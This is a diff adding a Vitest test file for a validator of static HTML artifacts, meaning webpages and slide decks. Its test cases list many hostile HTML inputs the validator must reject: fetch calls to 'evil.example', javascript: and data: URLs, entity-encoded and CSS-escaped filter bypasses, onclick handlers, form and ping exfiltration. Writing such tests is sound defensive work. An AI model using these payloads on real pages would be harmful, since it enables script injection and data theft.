@@ -1,0 +1,300 @@
+import { describe, expect, it } from "vitest"
+import {
+  STATIC_ARTIFACT_DECK_NAVIGATION_SCRIPT,
+  validateStaticHtml,
+} from "./static-html-validator.js"
+
+describe("static HTML validator", () => {
+  it("accepts bounded static webpage and slide HTML", () => {
+    expect(
+      validateStaticHtml({
+        artifactType: "webpage",
+        renderMode: "html",
+        html: "<main><h1>Launch</h1><p>Static content</p></main>",
+        maxBytes: 1024,
+      })
+    ).toMatchObject({ ok: true })
+
+    expect(
+      validateStaticHtml({
+        artifactType: "slides",
+        renderMode: "html",
+        html: `<section class="slide"><h1>One</h1></section><script>\n${STATIC_ARTIFACT_DECK_NAVIGATION_SCRIPT}\n</script>`,
+        maxBytes: 1024,
+      })
+    ).toMatchObject({ ok: true })
+  })
+
+  it("rejects the owned deck navigation script outside slide decks", () => {
+    expect(
+      validateStaticHtml({
+        artifactType: "webpage",
+        renderMode: "html",
+        html: `<main><h1>Launch</h1></main><script>${STATIC_ARTIFACT_DECK_NAVIGATION_SCRIPT}</script>`,
+        maxBytes: 2048,
+      })
+    ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+  })
+
+  it("allows static prose that mentions Agentis API paths without executing them", () => {
+    expect(
+      validateStaticHtml({
+        artifactType: "webpage",
+        renderMode: "html",
+        html: "<main><p>Agentis API routes such as /api/health are documentation text.</p></main>",
+        maxBytes: 1024,
+      })
+    ).toMatchObject({ ok: true })
+  })
+
+  it("rejects unsafe runtime behavior and unapproved network dependencies", () => {
+    const cases = [
+      "<script src=\"https://evil.example/app.js\"></script>",
+      "<script>window['f'+'etch']('https://evil.example/data')</script>",
+      "<script>fetch('https://evil.example/data')//",
+      "<script>document.body.classList.add('ready')</script>",
+      "<link rel=\"stylesheet\" href=\"https://evil.example/app.css\">",
+      "<link rel=stylesheet href=https://evil.example/app.css>",
+      "<link rel=\"preload stylesheet\" href=\"https://evil.example/app.css\">",
+      "<link rel=\"alternate stylesheet\" href=\"https://evil.example/alternate.css\">",
+      "<link rel='stylesheet preload' href=https://evil.example/app.css>",
+      "<a href=/api/threads>Runtime link</a>",
+      '<a href="javascript:alert(1)">Runtime link</a>',
+      '<a href="java&#x73;cript:alert(1)">Runtime link</a>',
+      '<a href="java\nscript:alert(1)">Runtime link</a>',
+      '<a href="data:text/html,<script>alert(1)</script>">Runtime link</a>',
+      '<a href="vbscript:msgbox(1)">Runtime link</a>',
+      '<a href="/library">Runtime link</a>',
+      '<a href="relative-page.html">Runtime link</a>',
+      "<button formaction=\"/api/runs\">Go</button>",
+      '<button formaction="javascript:alert(1)">Go</button>',
+      "<button onclick=\"alert(1)\">Run</button>",
+      "<script>fetch('/api/threads')</script>",
+      "<script>new XMLHttpRequest()</script>",
+      "<script>new WebSocket('wss://example.com')</script>",
+      "<script>new EventSource('/events')</script>",
+      "<script>localStorage.setItem('x','y')</script>",
+      "<script>window.agentis.runtime.callTool()</script>",
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("rejects active navigation and executable attribute bypasses", () => {
+    const cases = [
+      '<iframe srcdoc="&lt;script&gt;fetch(\'https://evil.example/x\')&lt;/script&gt;"></iframe>',
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/x">',
+      '<meta http-equiv="refresh" content="0;url=/local">',
+      '<form action="https://evil.example/post"><button>Send</button></form>',
+      '<form action="https&#x3a;//evil.example/post"><button>Send</button></form>',
+      '<form action="/api/runs"><button>Send</button></form>',
+      '<button formaction="https&#x3a;//evil.example/post">Send</button>',
+      '<button formaction="/api/runs">Send</button>',
+      '<a ping="https://evil.example/ping" href="#next">Next</a>',
+      '<a ping="/api/ping" href="#next">Next</a>',
+      '<a ping href="#next">Next</a>',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("rejects dangerous attributes after quoted tag delimiters", () => {
+    const cases = [
+      '<iframe title=">" srcdoc="<p>Hello</p>"></iframe>',
+      '<a title=">" ping="https://evil.example/p" href="#x">x</a>',
+      '<form title=">" action="https://evil.example/post"><button>Send</button></form>',
+      '<meta title=">" http-equiv="refresh" content="0;url=https://evil.example">',
+      '<img title=">" src="https://evil.example/x.png" alt="x">',
+      '<link title=">" href="https://evil.example/x.css">',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("rejects external hrefs on link elements because they load network dependencies", () => {
+    const cases = [
+      '<link rel="preload" href="https://cdn.example/font.woff2" as="font">',
+      '<link rel="modulepreload" href="https://cdn.example/app.js">',
+      '<link rel="icon" href="https://cdn.example/favicon.ico">',
+      '<link rel="preconnect" href="https://cdn.example">',
+      '<link href="https&#x3a;//cdn.example/x.css">',
+      '<link rel="stylesheet" href="/assets/index.css">',
+      '<link rel="stylesheet" href="theme.css">',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("rejects all dynamic imports in script bodies", () => {
+    const cases = [
+      '<script type="module">import("https://cdn.example/app.js")</script>',
+      '<script type="module">import("https:" + "//cdn.example/app.js")</script>',
+      '<script type="module">import("./local-module.js")</script>',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("rejects remote static module imports and re-exports in script bodies", () => {
+    const cases = [
+      '<script type="module">import app from "https://cdn.example/app.js"</script>',
+      '<script type="module">export { app } from "https://cdn.example/app.js"</script>',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("rejects external resource loads in CSS, media, and SVG resource tags", () => {
+    const cases = [
+      "<style>@import url('https://cdn.example/theme.css');</style>",
+      "<style>@import url('https://cdn.example/theme.css')",
+      "<style>.hero{background-image:url(https://cdn.example/hero.png)}</style>",
+      "<style>.hero{background-image:url(https&#x3a;//cdn.example/hero.png)}</style>",
+      "<style>.hero{background-image:url(https\\3a //cdn.example/hero.png)}</style>",
+      "<style>.hero{background-image:url(\\68ttps://cdn.example/hero.png)}</style>",
+      "<section style=\"background:url('https://cdn.example/pattern.svg')\"></section>",
+      "<section style=\"background:url(https\\3a //cdn.example/pattern.svg)\"></section>",
+      "<section style=\"background:url(\\68ttps://cdn.example/pattern.svg)\"></section>",
+      "<img src=\"https://cdn.example/photo.png\" alt=\"Remote\">",
+      '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
+      '<img src="javascript:alert(1)" alt="Remote">',
+      '<img src="/some-app-asset.png" alt="Runtime">',
+      '<img src="local-asset.png" alt="Runtime">',
+      "<img src=\"https&#x3a;//cdn.example/x.png\" alt=\"Remote\">",
+      "<img srcset=\"/local-small.png 1x, https://cdn.example/large.png 2x\" alt=\"Remote\">",
+      '<img srcset="/local-small.png 1x, data:image/svg+xml,<svg 2x" alt="Remote">',
+      "<source srcset=\"https://cdn.example/large.webp 800w\">",
+      "<iframe src=\"https://cdn.example/embed\"></iframe>",
+      '<iframe src="/library"></iframe>',
+      "<video src=\"https://cdn.example/movie.mp4\"></video>",
+      "<video poster=\"https://cdn.example/poster.png\"></video>",
+      "<audio src=\"https://cdn.example/audio.mp3\"></audio>",
+      "<input type=\"image\" src=\"https://cdn.example/button.png\" alt=\"Submit\">",
+      "<track src=\"https://cdn.example/captions.vtt\" kind=\"captions\">",
+      "<track src=\"https&#x3a;//cdn.example/c.vtt\">",
+      "<object data=\"https://cdn.example/widget.svg\"></object>",
+      "<embed src=\"https://cdn.example/widget.svg\">",
+      '<svg><image href="https://cdn.example/x.png"></image></svg>',
+      '<svg><image xlink:href="https://cdn.example/x.png"></image></svg>',
+      '<object data="/api/runs"></object>',
+      '<video poster="/api/runs"></video>',
+      '<img srcset="/local-small.png 1x, /api/runs 2x" alt="Runtime">',
+      '<svg><image href="/api/runs"></image></svg>',
+      '<style>.x{background:url(/api/runs)}</style>',
+      '<style>.x{background:url(javascript:alert(1))}</style>',
+      '<style>.x{background:url(data:image/svg+xml,<svg></svg>)}</style>',
+      '<section style="background:url(/api/runs)"></section>',
+      '<style>@import url("/api/runs");</style>',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
+  it("allows local anchor hrefs while rejecting resource external hrefs", () => {
+    expect(
+      validateStaticHtml({
+        artifactType: "webpage",
+        renderMode: "html",
+        html: '<main><a href="#section">Jump</a><section id="section">Local</section></main>',
+        maxBytes: 2048,
+      })
+    ).toMatchObject({ ok: true })
+  })
+
+  it("rejects base tags because they can turn relative resource paths into network loads", () => {
+    expect(
+      validateStaticHtml({
+        artifactType: "webpage",
+        renderMode: "html",
+        html: '<base href="https://cdn.example/"><img src="x.png">',
+        maxBytes: 2048,
+      })
+    ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+  })
+
+  it("rejects invalid mode combinations and oversized bundles", () => {
+    expect(
+      validateStaticHtml({
+        artifactType: "webpage",
+        renderMode: "polishedImage",
+        html: "<main></main>",
+        maxBytes: 2048,
+      })
+    ).toMatchObject({
+      ok: false,
+      code: "static_artifact_invalid_render_mode",
+    })
+
+    expect(
+      validateStaticHtml({
+        artifactType: "slides",
+        renderMode: "html",
+        html: "x".repeat(16),
+        maxBytes: 8,
+      })
+    ).toMatchObject({ ok: false, code: "static_artifact_bundle_too_large" })
+  })
+})
